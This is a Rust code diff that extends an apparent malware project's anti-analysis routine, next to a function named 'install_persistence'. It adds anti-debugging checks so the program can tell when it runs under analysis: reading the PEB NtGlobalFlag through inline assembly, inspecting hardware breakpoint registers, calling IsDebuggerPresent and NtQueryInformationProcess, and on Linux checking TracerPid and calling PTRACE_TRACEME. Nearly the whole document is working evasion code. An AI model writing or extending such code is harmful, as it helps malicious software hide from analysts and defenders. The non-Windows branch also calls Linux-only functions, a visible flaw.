@@ -271,7 +271,10 @@ fn install_persistence() {
 // ── Anti-analysis (inline, no libra-modules dependency) ───────────────
 
 fn is_sandbox(skip_uptime: bool) -> bool {
-    check_cpu_cores() || check_memory() || (!skip_uptime && check_uptime())
+    check_cpu_cores()
+        || check_memory()
+        || (!skip_uptime && check_uptime())
+        || check_debugger()
 }
 
 fn check_cpu_cores() -> bool {
@@ -294,6 +297,146 @@ fn check_memory() -> bool {
 fn check_uptime() -> bool {
     let uptime = get_system_uptime_secs();
     uptime < 300
+}
+
+// ── Anti-debug ────────────────────────────────────────────────────────
+
+fn check_debugger() -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        check_nt_global_flag() || check_hardware_breakpoints() || check_remote_debugger()
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        check_ptrace_traceme() || check_tracer_pid()
+    }
+}
+
+/// PEB->NtGlobalFlag: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
+/// Set by default when a process is started under a debugger.
+#[cfg(target_os = "windows")]
+fn check_nt_global_flag() -> bool {
+    unsafe {
+        // Read PEB via TEB (gs:0x60 on x64)
+        let peb: *const u8;
+        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+        if peb.is_null() {
+            return false;
+        }
+        // NtGlobalFlag is at PEB+0xBC on x64
+        let nt_global_flag = *(peb.add(0xBC) as *const u32);
+        const FLG_HEAP_ENABLE_TAIL_CHECK: u32 = 0x10;
+        const FLG_HEAP_ENABLE_FREE_CHECK: u32 = 0x20;
+        const FLG_HEAP_VALIDATE_PARAMETERS: u32 = 0x40;
+        nt_global_flag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS) != 0
+    }
+}
+
+/// Check hardware breakpoints by reading DR0-DR3 via GetThreadContext.
+/// Debuggers set hardware breakpoints by writing to debug registers.
+#[cfg(target_os = "windows")]
+fn check_hardware_breakpoints() -> bool {
+    use std::mem;
+
+    #[repr(C, align(16))]
+    struct Context64 {
+        _p1_home: u64, _p2_home: u64, _p3_home: u64, _p4_home: u64,
+        _p5_home: u64, _p6_home: u64, _context_flags: u32,
+        _mx_csr: u32,
+        _seg_cs: u16, _seg_ds: u16, _seg_es: u16, _seg_fs: u16, _seg_gs: u16, _seg_ss: u16,
+        _eflags: u32, _dr0: u64, _dr1: u64, _dr2: u64, _dr3: u64,
+        _dr6: u64, _dr7: u64,
+        _rax: u64, _rcx: u64, _rdx: u64, _rbx: u64,
+        _rsp: u64, _rbp: u64, _rsi: u64, _rdi: u64,
+        _r8: u64, _r9: u64, _r10: u64, _r11: u64,
+        _r12: u64, _r13: u64, _r14: u64, _r15: u64,
+        _rip: u64,
+        // ... rest omitted, we only need Dr0-Dr3
+    }
+
+    extern "system" {
+        fn GetThreadContext(hthread: *mut std::ffi::c_void, lpcontext: *mut Context64) -> i32;
+        fn GetCurrentThread() -> *mut std::ffi::c_void;
+    }
+
+    unsafe {
+        let mut ctx: Context64 = mem::zeroed();
+        // CONTEXT_DEBUG_REGISTERS = 0x00100010
+        // CONTEXT_ALL = 0x0010001F (we need DR flags)
+        ctx._context_flags = 0x00100010;
+        if GetThreadContext(GetCurrentThread(), &mut ctx) != 0 {
+            // If any debug register is set, a debugger is present
+            return ctx._dr0 != 0 || ctx._dr1 != 0 || ctx._dr2 != 0 || ctx._dr3 != 0;
+        }
+        false
+    }
+}
+
+/// Check IsDebuggerPresent and NtQueryInformationProcess(DebugPort)
+#[cfg(target_os = "windows")]
+fn check_remote_debugger() -> bool {
+    unsafe {
+        extern "system" {
+            fn IsDebuggerPresent() -> i32;
+            fn LoadLibraryA(lpFileName: *const u8) -> *mut u8;
+            fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
+        }
+
+        if IsDebuggerPresent() != 0 {
+            return true;
+        }
+
+        // NtQueryInformationProcess(ProcessDebugPort = 7)
+        type NtQIP = unsafe extern "system" fn(
+            *mut std::ffi::c_void, u32, *mut u8, u32, *mut u32,
+        ) -> i32;
+
+        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
+        if ntdll.is_null() {
+            return false;
+        }
+        let proc = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr());
+        if proc.is_null() {
+            return false;
+        }
+        let nt_query: NtQIP = std::mem::transmute(proc);
+        let mut debug_port: usize = 0;
+        // ProcessDebugPort = 7
+        let status = nt_query(
+            std::ptr::null_mut(),
+            7,
+            &mut debug_port as *mut usize as *mut u8,
+            std::mem::size_of::<usize>() as u32,
+            std::ptr::null_mut(),
+        );
+        status == 0 && debug_port != 0
+    }
+}
+
+/// Linux: check if /proc/self/status shows TracerPid != 0
+#[cfg(target_os = "linux")]
+fn check_tracer_pid() -> bool {
+    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
+        for line in status.lines() {
+            if line.starts_with("TracerPid:") {
+                let pid_str = line["TracerPid:".len()..].trim();
+                if let Ok(pid) = pid_str.parse::<u32>() {
+                    return pid != 0;
+                }
+            }
+        }
+    }
+    false
+}
+
+/// Linux: try ptrace(PTRACE_TRACEME) — fails if already traced
+#[cfg(target_os = "linux")]
+fn check_ptrace_traceme() -> bool {
+    const PTRACE_TRACEME: i64 = 0;
+    unsafe {
+        // If we're already being traced, ptrace returns -1
+        libc::ptrace(PTRACE_TRACEME, 0, 0, 0) == -1
+    }
 }
 
 fn get_system_uptime_secs() -> u64 {
